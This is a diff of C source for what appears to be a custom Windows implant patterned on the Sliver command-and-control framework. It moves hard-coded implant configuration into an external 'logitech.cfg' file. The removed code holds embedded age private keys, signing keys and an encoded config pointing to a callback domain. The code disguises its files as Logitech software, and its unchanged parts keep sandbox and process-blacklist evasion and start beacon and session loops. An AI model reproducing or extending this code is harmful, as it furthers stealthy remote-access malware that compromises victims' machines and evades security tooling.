@@ -2274,9 +2274,14 @@ void test133(void) {
 }
 
 void test134(void) {
-	BYTE MarshaledData[] = { 10, 62, 97, 103, 101, 49, 53, 116, 109, 122, 97, 108, 110, 97, 116, 120, 120, 117, 117, 110, 51, 120, 54, 115, 54, 120, 48, 107, 108, 118, 121, 121, 113, 100, 53, 100, 122, 101, 110, 50, 53, 50, 101, 51, 52, 54, 54, 53, 53, 121, 102, 100, 113, 56, 106, 117, 113, 113, 97, 107, 116, 119, 120, 108, 18, 62, 97, 103, 101, 49, 116, 99, 121, 106, 102, 52, 56, 104, 53, 53, 121, 53, 56, 120, 99, 97, 109, 119, 115, 97, 99, 97, 122, 103, 48, 57, 112, 56, 104, 99, 115, 97, 118, 104, 115, 103, 102, 106, 97, 121, 97, 118, 99, 100, 55, 119, 121, 99, 54, 97, 103, 115, 108, 100, 118, 107, 101, 110, 26, 74, 65, 71, 69, 45, 83, 69, 67, 82, 69, 84, 45, 75, 69, 89, 45, 49, 65, 57, 81, 74, 76, 54, 65, 72, 86, 57, 80, 53, 88, 80, 75, 74, 78, 72, 70, 54, 75, 88, 78, 55, 74, 65, 72, 69, 88, 84, 68, 56, 55, 86, 75, 77, 67, 82, 51, 56, 84, 70, 80, 84, 81, 89, 88, 90, 67, 51, 84, 81, 75, 86, 77, 78, 90, 55, 34, 113, 117, 110, 116, 114, 117, 115, 116, 101, 100, 32, 99, 111, 109, 109, 101, 110, 116, 58, 32, 109, 105, 110, 105, 115, 105, 103, 110, 32, 112, 117, 98, 108, 105, 99, 32, 107, 101, 121, 58, 32, 70, 57, 65, 52, 51, 65, 70, 69, 66, 66, 55, 50, 56, 53, 67, 70, 10, 82, 87, 84, 80, 104, 88, 75, 55, 47, 106, 113, 107, 43, 102, 103, 118, 52, 80, 101, 83, 79, 78, 71, 117, 100, 114, 78, 77, 84, 56, 118, 122, 87, 81, 111, 119, 122, 84, 102, 71, 119, 88, 108, 69, 118, 98, 71, 103, 75, 87, 83, 89, 97, 109, 121, 50, 42, 14, 68, 69, 67, 73, 83, 73, 86, 69, 95, 70, 69, 82, 82, 89, 50, 36, 57, 101, 99, 100, 52, 55, 55, 50, 45, 50, 50, 101, 100, 45, 52, 50, 56, 100, 45, 98, 101, 48, 55, 45, 97, 50, 53, 55, 57, 48, 57, 50, 102, 55, 52, 48, 58, 163, 2, 117, 110, 116, 114, 117, 115, 116, 101, 100, 32, 99, 111, 109, 109, 101, 110, 116, 58, 32, 115, 105, 103, 110, 97, 116, 117, 114, 101, 32, 102, 114, 111, 109, 32, 112, 114, 105, 118, 97, 116, 101, 32, 107, 101, 121, 58, 32, 70, 57, 65, 52, 51, 65, 70, 69, 66, 66, 55, 50, 56, 53, 67, 70, 10, 82, 87, 84, 80, 104, 88, 75, 55, 47, 106, 113, 107, 43, 86, 97, 99, 70, 88, 52, 105, 66, 103, 111, 51, 90, 119, 119, 103, 53, 66, 90, 113, 83, 48, 118, 121, 70, 120, 114, 57, 48, 113, 43, 87, 43, 106, 111, 48, 77, 76, 99, 115, 97, 121, 86, 65, 51, 72, 106, 120, 115, 69, 112, 68, 68, 85, 107, 75, 69, 76, 110, 84, 50, 105, 51, 73, 118, 107, 43, 118, 66, 73, 78, 87, 89, 113, 112, 53, 82, 111, 72, 106, 97, 73, 70, 82, 105, 103, 103, 61, 10, 116, 114, 117, 115, 116, 101, 100, 32, 99, 111, 109, 109, 101, 110, 116, 58, 32, 116, 105, 109, 101, 115, 116, 97, 109, 112, 58, 49, 55, 51, 48, 51, 51, 54, 57, 49, 53, 10, 51, 56, 99, 70, 56, 83, 102, 55, 87, 75, 65, 117, 50, 67, 55, 51, 100, 47, 89, 65, 48, 110, 71, 67, 55, 116, 69, 111, 82, 122, 56, 113, 122, 102, 79, 49, 99, 83, 89, 97, 57, 54, 97, 80, 116, 65, 111, 120, 105, 56, 67, 117, 97, 56, 90, 50, 71, 85, 89, 49, 112, 55, 72, 55, 107, 111, 117, 79, 108, 68, 114, 72, 54, 121, 105, 105, 114, 50, 77, 47, 78, 112, 80, 82, 65, 81, 61, 61, 64, 13, 72, 5, 80, 216, 4, 90, 18, 37, 65, 80, 80, 68, 65, 84, 65, 37, 92, 76, 111, 103, 105, 116, 101, 99, 104, 122, 201, 2, 10, 6, 115, 99, 114, 105, 112, 116, 10, 11, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 115, 10, 10, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 10, 7, 106, 115, 99, 114, 105, 112, 116, 10, 2, 106, 115, 10, 3, 117, 109, 100, 18, 6, 106, 113, 117, 101, 114, 121, 18, 5, 114, 111, 117, 116, 101, 18, 3, 97, 112, 112, 26, 6, 117, 112, 108, 111, 97, 100, 26, 7, 97, 99, 116, 105, 111, 110, 115, 34, 7, 115, 97, 109, 112, 108, 101, 115, 34, 3, 97, 112, 105, 42, 6, 97, 115, 115, 101, 116, 115, 42, 6, 105, 109, 97, 103, 101, 115, 50, 7, 101, 120, 97, 109, 112, 108, 101, 50, 7, 102, 97, 118, 105, 99, 111, 110, 58, 116, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 49, 48, 46, 48, 59, 32, 87, 105, 110, 54, 52, 59, 32, 120, 54, 52, 41, 32, 65, 112, 112, 108, 101, 87, 101, 98, 75, 105, 116, 47, 53, 51, 55, 46, 51, 54, 32, 40, 75, 72, 84, 77, 76, 44, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, 41, 32, 67, 104, 114, 111, 109, 101, 47, 49, 48, 54, 46, 48, 46, 57, 50, 54, 53, 46, 57, 56, 50, 32, 83, 97, 102, 97, 114, 105, 47, 53, 51, 55, 46, 51, 54, 66, 32, 71, 81, 72, 52, 82, 66, 85, 66, 83, 79, 76, 88, 52, 52, 54, 78, 50, 67, 66, 67, 83, 55, 65, 89, 72, 89, 76, 66, 77, 65, 50, 65, 72, 30, 80, 2, 88, 4, 96, 3, 104, 1, 114, 29, 104, 116, 116, 112, 58, 47, 47, 117, 98, 117, 110, 116, 117, 45, 105, 99, 101, 102, 114, 111, 103, 50, 48, 48, 48, 46, 99, 111, 109 };
-	WCHAR wszPath[] = L"C:\\Users\\Admin\\AppData\\Local\\Temp\\file.tmp";
-	WriteToFile(wszPath, MarshaledData, sizeof(MarshaledData));
+	WCHAR wszPath[0x200];
+	LPWSTR lpTemp = NULL;
+
+	GetModuleFileNameW(NULL, wszPath, _countof(wszPath));
+	lpTemp = PathFindFileNameW(wszPath);
+	lpTemp[0] = L'\0';
+
+	lstrcatW(wszPath, L"logitech.cfg");
 	UnmarshalConfig(wszPath);
 	DeleteFileW(wszPath);
 }
@@ -2385,60 +2390,60 @@ VOID Final(VOID)
 	DWORD dwThreadId = 0;
 	DWORD cchSliverPath = 0;
 	PGLOBAL_CONFIG pGlobalConfig = NULL;
-
-	UINT64 uEncoderNonce = 13;
-	DWORD dwMaxFailure = 5;
-	DWORD dwReconnectInterval = 600;
-
-#ifdef _BEACON
-	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
-	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-	CHAR szPeerPubKey[] = "age1z8yd2vkrxqelp82fhhsqwql5zvvjl2jzc2us03uqu9j72ve79g8s4fcp6v";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-12FPRDVR7Y9J7GHHCE3R0UN0MKLC7RS3Z48NW0C9CJ3PWJU3HX6UQFLMXPN";
-	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	CHAR szSliverClientName[] = "SOFT_TUNIC";
-	CHAR szConfigId[] = "e3db8606-9375-4678-82ad-954b426e1186";
-#elif _SESSION
-	// From Phan Chu Trinh
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-	CHAR szPeerPubKey[] = "age1tcyjf48h55y58xcamwsacazg09p8hcsavhsgfjayavcd7wyc6agsldvken";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1A9QJL6AHV9P5XPKJNHF6KXN7JAHEXTD87VKMCR38TFPTQYXZC3TQKVMNZ7";
-	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	CHAR szSliverClientName[] = "DECISIVE_FERRY";
-	CHAR szConfigId[] = "9ecd4772-22ed-428d-be07-a2579092f740";
-	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+VacFX4iBgo3Zwwg5BZqS0vyFxr90q+W+jo0MLcsayVA3HjxsEpDDUkKELnT2i3Ivk+vBINWYqp5RoHjaIFRigg=\ntrusted comment: timestamp:1730336915\n38cF8Sf7WKAu2C73d/YA0nGC7tEoRz8qzfO1cSYa96aPtAoxi8Cua8Z2GUY1p7H7kouOlDrH6yiir2M/NpPRAQ==";
+	PSLIVER_SESSION_CLIENT pBeaconClient = NULL;
+	WCHAR wszConfigPath[MAX_PATH];
+	LPWSTR lpTemp = NULL;
 
-	// From Tu Dinh
-	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-	CHAR szPeerPubKey[] = "age1dr6wu66ys8xw77ntv3c5323juar0mu3pfzh3w8keu7r26szctenq9ml0y9";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1WMHCENFT9V35KGJL7AC79LQ7YU595YYKYDZU4N5RXSDTVMK9KJ7SKS9GX0";
-	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	CHAR szSliverClientName[] = "PLASTIC_DATABASE";
-	CHAR szConfigId[] = "8001d686-212d-42b6-a86f-0a9681cf2fe9";
-	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+Uq5ZWjBjIeNjPAooGy+Gpce+sumpkwtSKhq1bumFSaTBscU1U935RabU7M+oII4JtgB37MnzuaBIG81eUG2VQA=\ntrusted comment: timestamp:1730113878\nCo1qxEq5AOdhuc1ZhSdRGUB58roaBdKF/og6W/2g/3g2s0jpXWyqmVNwXLHszJdFl78diQ15qd1KmmWPRRdmAw==";*/
-#else
-	// From Phan Chu Trinh
-	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	CHAR szPeerPubKey[] = "age15m9jy6r9m7296x0m4azhp06883llkw8kpyzs64mte5rv5s5zrf6qz2hmse";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-15T653732A6NJFGP0RCUL3UUEE0JY0D9YRRL0WJ5T697SZSULA4WSL4KEV2";
-	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+W4BCidBiGftXn3B5BhF2iTvOKLITSXl8VuKkPw/0kWDwiDbrkvg9jbNmZD1bAkFCUpMtvri+4OsKLESnwmDuAs=\ntrusted comment: timestamp:1730337887\nxCTWnliJrfPawWnUmTY2P7ccJRZSa6LnyjMEdZCgEhef02WbBJh8RfMsz/I/ZrmPtpCNc1F4n2U+kghilIuzDA==";
-	CHAR szSliverClientName[] = "TECHNICAL_FORAY";
-	CHAR szConfigId[] = "5559e761-e90c-4b5e-893d-58eb247aa086";*/
-
-	// From Tu Dinh
-	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	CHAR szPeerPubKey[] = "age1kcgw9sshhgjl99gtdqg5crtlx9e9dgnm688j9ce98pcz6dwt73zs6jj4nm";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1KJ8M0NGRMJ90W2U08LVJLLA848TKXP6QKTH30STS3NHXV5MEDJ4Q95FZUM";
-	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+R1arZLraIBUFzy0FUA0fqQpdqqvpOtaYQ4T6EQa9BWN6G096nSfuMikQayWIdxsyc0/cqy0hppjz8NPqZbl+g4=\ntrusted comment: timestamp:1730114144\nkpsqCc+x7Ag2kVnhTXSuhY4VJkI/KGV5KR6unjmlYUEEKTP9z5UZc+8Rtxir2/QqLV+gJOj6JY+xXMpb0mytDA==";
-	CHAR szSliverClientName[] = "WORRIED_ABDOMEN";
-	CHAR szConfigId[] = "018dbe78-4ee7-4ab2-a49a-fa1feb2dab74";
-#endif
+//#ifdef _BEACON
+//	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
+//	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+//	CHAR szPeerPubKey[] = "age1z8yd2vkrxqelp82fhhsqwql5zvvjl2jzc2us03uqu9j72ve79g8s4fcp6v";
+//	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-12FPRDVR7Y9J7GHHCE3R0UN0MKLC7RS3Z48NW0C9CJ3PWJU3HX6UQFLMXPN";
+//	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+//	CHAR szSliverClientName[] = "SOFT_TUNIC";
+//	CHAR szConfigId[] = "e3db8606-9375-4678-82ad-954b426e1186";
+//#elif _SESSION
+//	// From Phan Chu Trinh
+//	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+//	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+//	CHAR szPeerPubKey[] = "age1tcyjf48h55y58xcamwsacazg09p8hcsavhsgfjayavcd7wyc6agsldvken";
+//	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1A9QJL6AHV9P5XPKJNHF6KXN7JAHEXTD87VKMCR38TFPTQYXZC3TQKVMNZ7";
+//	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+//	CHAR szSliverClientName[] = "DECISIVE_FERRY";
+//	CHAR szConfigId[] = "9ecd4772-22ed-428d-be07-a2579092f740";
+//	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+VacFX4iBgo3Zwwg5BZqS0vyFxr90q+W+jo0MLcsayVA3HjxsEpDDUkKELnT2i3Ivk+vBINWYqp5RoHjaIFRigg=\ntrusted comment: timestamp:1730336915\n38cF8Sf7WKAu2C73d/YA0nGC7tEoRz8qzfO1cSYa96aPtAoxi8Cua8Z2GUY1p7H7kouOlDrH6yiir2M/NpPRAQ==";
+//
+//	// From Tu Dinh
+//	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+//	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+//	CHAR szPeerPubKey[] = "age1dr6wu66ys8xw77ntv3c5323juar0mu3pfzh3w8keu7r26szctenq9ml0y9";
+//	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1WMHCENFT9V35KGJL7AC79LQ7YU595YYKYDZU4N5RXSDTVMK9KJ7SKS9GX0";
+//	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+//	CHAR szSliverClientName[] = "PLASTIC_DATABASE";
+//	CHAR szConfigId[] = "8001d686-212d-42b6-a86f-0a9681cf2fe9";
+//	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+Uq5ZWjBjIeNjPAooGy+Gpce+sumpkwtSKhq1bumFSaTBscU1U935RabU7M+oII4JtgB37MnzuaBIG81eUG2VQA=\ntrusted comment: timestamp:1730113878\nCo1qxEq5AOdhuc1ZhSdRGUB58roaBdKF/og6W/2g/3g2s0jpXWyqmVNwXLHszJdFl78diQ15qd1KmmWPRRdmAw==";*/
+//#else
+//	// From Phan Chu Trinh
+//	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+//	CHAR szPeerPubKey[] = "age15m9jy6r9m7296x0m4azhp06883llkw8kpyzs64mte5rv5s5zrf6qz2hmse";
+//	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-15T653732A6NJFGP0RCUL3UUEE0JY0D9YRRL0WJ5T697SZSULA4WSL4KEV2";
+//	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+//	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+//	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+W4BCidBiGftXn3B5BhF2iTvOKLITSXl8VuKkPw/0kWDwiDbrkvg9jbNmZD1bAkFCUpMtvri+4OsKLESnwmDuAs=\ntrusted comment: timestamp:1730337887\nxCTWnliJrfPawWnUmTY2P7ccJRZSa6LnyjMEdZCgEhef02WbBJh8RfMsz/I/ZrmPtpCNc1F4n2U+kghilIuzDA==";
+//	CHAR szSliverClientName[] = "TECHNICAL_FORAY";
+//	CHAR szConfigId[] = "5559e761-e90c-4b5e-893d-58eb247aa086";*/
+//
+//	// From Tu Dinh
+//	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+//	CHAR szPeerPubKey[] = "age1kcgw9sshhgjl99gtdqg5crtlx9e9dgnm688j9ce98pcz6dwt73zs6jj4nm";
+//	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1KJ8M0NGRMJ90W2U08LVJLLA848TKXP6QKTH30STS3NHXV5MEDJ4Q95FZUM";
+//	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+//	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+//	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+R1arZLraIBUFzy0FUA0fqQpdqqvpOtaYQ4T6EQa9BWN6G096nSfuMikQayWIdxsyc0/cqy0hppjz8NPqZbl+g4=\ntrusted comment: timestamp:1730114144\nkpsqCc+x7Ag2kVnhTXSuhY4VJkI/KGV5KR6unjmlYUEEKTP9z5UZc+8Rtxir2/QqLV+gJOj6JY+xXMpb0mytDA==";
+//	CHAR szSliverClientName[] = "WORRIED_ABDOMEN";
+//	CHAR szConfigId[] = "018dbe78-4ee7-4ab2-a49a-fa1feb2dab74";
+//#endif
 
 #ifndef _DEBUG
 	if (DetectSandbox4() || DetectSandbox5() || CheckForBlackListProcess()) {
@@ -2446,28 +2451,23 @@ VOID Final(VOID)
 	}
 #endif
 
-	pGlobalConfig = ALLOC(sizeof(GLOBAL_CONFIG));
-	pGlobalConfig->lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
-	pGlobalConfig->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
-	pGlobalConfig->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
-	pGlobalConfig->lpConfigID = DuplicateStrA(szConfigId, 0);
-	pGlobalConfig->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
-	pGlobalConfig->lpPeerAgePublicKeySignature = DuplicateStrA(szPeerAgePublicKeySignature, 0);
-	pGlobalConfig->lpSliverName = DuplicateStrA(szSliverClientName, 0);
-	pGlobalConfig->uEncoderNonce = uEncoderNonce;
-	pGlobalConfig->dwMaxFailure = dwMaxFailure;
-	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;
-	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
-	pGlobalConfig->uPeerID = GeneratePeerID();
-	pGlobalConfig->dwListenerID = 1;
-	pGlobalConfig->lpScriptPath = ALLOC(sizeof(WCHAR) * MAX_PATH);
-	cchSliverPath = ExpandEnvironmentStringsW(L"%APPDATA%\\Logitech", pGlobalConfig->lpScriptPath, MAX_PATH);
-	if (cchSliverPath >= MAX_PATH) {
-		pGlobalConfig->lpScriptPath = REALLOC(pGlobalConfig->lpScriptPath, (cchSliverPath + 1) * sizeof(WCHAR));
-		ExpandEnvironmentStringsW(L"%APPDATA%\\Logitech", pGlobalConfig->lpScriptPath, cchSliverPath + 1);
+	GetModuleFileNameW(NULL, wszConfigPath, _countof(wszConfigPath));
+	lpTemp = PathFindFileNameW(wszConfigPath);
+	lpTemp[0] = L'\0';
+	lstrcatW(wszConfigPath, L"logitech.cfg");
+	if (!IsFileExist(wszConfigPath)) {
+		goto CLEANUP;
 	}
 
+	pGlobalConfig = UnmarshalConfig(wszConfigPath);
+	if (pGlobalConfig == NULL) {
+		goto CLEANUP;
+	}
+
+	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
 	InitializeSRWLock(&pGlobalConfig->RWLock);
+	pGlobalConfig->uPeerID = GeneratePeerID();
+	pGlobalConfig->dwListenerID = 1;
 	if (IsExist(pGlobalConfig)) {
 		goto CLEANUP;
 	}
@@ -2478,23 +2478,21 @@ VOID Final(VOID)
 	}
 #endif
 
-#ifdef _BEACON
-	pBeaconClient = BeaconInit(pGlobalConfig);
-	BeaconMainLoop(pBeaconClient);
-#elif _SESSION
-	pSessionClient = SessionInit(pGlobalConfig);
-	SessionMainLoop(pSessionClient);
-#else
-	pSessionClient = SessionInit(pGlobalConfig);
-	SessionMainLoop(pSessionClient);
-#endif
+	if (pGlobalConfig->Type == Beacon) {
+		pBeaconClient = BeaconInit(pGlobalConfig);
+		BeaconMainLoop(pBeaconClient);
+	}
+	else if (pGlobalConfig->Type == Session || pGlobalConfig->Type == Pivot) {
+		pSessionClient = SessionInit(pGlobalConfig);
+		SessionMainLoop(pSessionClient);
+	}
+	else {
+		goto CLEANUP;
+	}
 
 CLEANUP:
-#ifdef _BEACON
 	FreeBeaconClient(pBeaconClient);
-#else
 	FreeSessionClient(pSessionClient);
-#endif
 	FreeGlobalConfig(pGlobalConfig);
 
 	return;
@@ -2629,13 +2627,13 @@ int WinMain
 	LoadLibraryW(L"wtsapi32.dll");
 	LoadLibraryW(L"RPCRT4.dll");
 
-	return MessageLoop(hInstance);
-	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageLoop, hInstance, 0, NULL);
+	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageLoop, hInstance, 0, NULL);
 	if (hThread == NULL) {
+		LOG_ERROR("CreateThread", GetLastError())
 		goto CLEANUP;
-	}*/
+	}
 
-	Sleep(1000000);
+	Sleep(2000);
 	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
 	//test1();
 	//test2(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
@@ -2766,8 +2764,8 @@ int WinMain
 	//test131();
 	//test132();
 	//test133();
-	//test134();
-	test135();
+	test134();
+	//test135();
 	//Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
